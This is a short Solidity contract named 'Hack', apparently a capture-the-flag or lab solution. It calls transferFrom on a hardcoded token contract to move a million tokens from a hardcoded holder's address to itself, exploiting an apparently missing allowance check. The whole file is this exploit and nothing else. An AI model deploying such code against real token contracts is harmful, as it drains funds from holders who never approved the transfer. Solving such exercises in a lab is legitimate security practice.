// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITraget {
     function transferFrom(address _from, address _to, uint256 _value) external returns (bool success);
}

contract Hack {
    event Log(uint256);
    event Attempt(uint256, bool);


    ITraget public target = ITraget(0x4F57F9239eFCBf43e5920f579D03B3849C588396);
    constructor() {
    }


    function hack() public {
        bool success = target.transferFrom(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266,address(this), 1000000000000000000000000);
        require(success, "failed");
    }

}

